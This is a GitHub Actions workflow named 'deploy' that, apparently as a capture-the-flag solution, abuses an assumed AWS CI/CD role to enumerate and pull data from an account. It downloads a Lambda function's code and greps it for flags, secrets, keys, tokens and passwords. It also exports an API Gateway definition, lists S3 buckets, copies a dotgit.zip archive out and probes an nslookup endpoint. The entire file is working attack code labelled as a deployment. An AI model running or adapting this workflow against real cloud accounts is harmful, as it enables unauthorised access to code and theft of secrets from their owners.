name: deploy

on:
  push:
    branches:
      - corgi

jobs:
  aws:
    runs-on: ubuntu-latest

    permissions:
      id-token: write
      contents: read

    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: AWS identity
        run: |
          aws sts get-caller-identity

      - name: Lambda configuration
        run: |
          echo "===== LAMBDA CONFIG ====="

          aws lambda get-function-configuration \
            --function-name nslookupv2

      - name: Download deployed Lambda code
        run: |
          echo "===== DOWNLOAD LAMBDA ====="

          aws lambda get-function \
            --function-name nslookupv2 \
            --query 'Code.Location' \
            --output text > lambda_url.txt

          curl -L -o lambda.zip "$(cat lambda_url.txt)"

          mkdir lambda_code
          unzip lambda.zip -d lambda_code

          echo "===== FILES ====="
          find lambda_code -type f

          echo "===== SEARCH ====="
          grep -RniE \
          "flag|secret|key|token|password|s3|subprocess|os|eval|exec|open" \
          lambda_code || true

      - name: Export API Gateway
        run: |
          echo "===== API GATEWAY ====="

          aws apigateway get-export \
            --rest-api-id 3q931syi7b \
            --stage-name dev \
            --export-type oas30 \
            api.json

          cat api.json

      - name: S3 discovery
        run: |
          echo "===== BUCKETS ====="

          aws s3 ls

          echo "===== PLATFORM BUCKET ====="

          aws s3 ls \
          s3://platform-bucket-009661764077-us-east-1/

          echo "===== DOTGIT ====="

          aws s3 cp \
          s3://platform-bucket-009661764077-us-east-1/dotgit.zip \
          dotgit.zip

          unzip -l dotgit.zip

      - name: CloudFront
        run: |
          echo "===== CLOUDFRONT ====="

          aws cloudfront list-distributions

      - name: Test API
        run: |
          echo "===== API TEST ====="

          curl -i -X POST \
          https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
          -H "Content-Type: application/json" \
          -d '{"domain":"example.com"}'
